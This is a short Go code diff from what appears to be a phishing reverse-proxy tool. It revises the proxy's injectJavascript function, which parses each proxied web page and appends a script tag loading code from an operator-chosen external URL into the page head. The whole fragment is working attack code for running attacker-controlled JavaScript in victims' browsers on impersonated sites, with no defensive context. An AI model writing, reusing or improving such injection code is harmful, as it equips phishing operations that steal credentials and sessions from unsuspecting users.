@@ -110,26 +110,17 @@ func (p *phishingProxy) injectJavascript(response *http.Response) error {
 		return nil
 	}
 
-	// Prevent NewDocumentFromReader from closing the response body.
-	responseText, err := ioutil.ReadAll(response.Body)
-	responseBuffer := bytes.NewBuffer(responseText)
-	response.Body = ioutil.NopCloser(responseBuffer)
-	if err != nil {
-		return err
-	}
-
 	document, err := goquery.NewDocumentFromResponse(response)
 	if err != nil {
 		return err
 	}
 
 	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", p.JavascriptURL)
-	selection := document.
+	_ = document.
 		Find("head").
-		AppendHtml(payload).
-		Parent()
+		AppendHtml(payload)
 
-	html, err := selection.Html()
+	html, err := document.Html()
 	if err != nil {
 		return err
 	}
